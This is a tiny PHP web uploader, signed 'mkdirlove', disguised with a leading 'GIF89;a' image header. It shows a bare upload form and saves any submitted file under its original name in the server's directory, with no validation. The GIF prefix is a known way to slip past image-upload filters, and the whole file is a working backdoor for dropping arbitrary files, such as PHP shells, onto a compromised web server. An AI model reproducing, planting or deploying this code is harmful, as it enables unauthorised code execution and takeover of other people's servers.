GIF89;a
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="utf-8">
		<style>*{font-family:'Courier New',sans-serif;font-size:14px;color:#ff003b;background-color:black;}</style>
	</head>
	<body>
		<?php echo "<center>File Uploader :: mkdirlove<br>";echo "<form method='POST' enctype='multipart/form-data'><input type='file' name='file2upload'><input type='submit' name='upload' value='Upload'></form></center>";$files = $_FILES['file2upload']['name'];if(isset($_POST['upload'])){if(@copy($_FILES['file2upload']['tmp_name'], $files)){echo "<center>[+] File <b>$files</b> has been uploaded [+]</center>";}else{echo "<center>[-] Upload has failed [-]</center>";}} ?>
	</body>
</html>
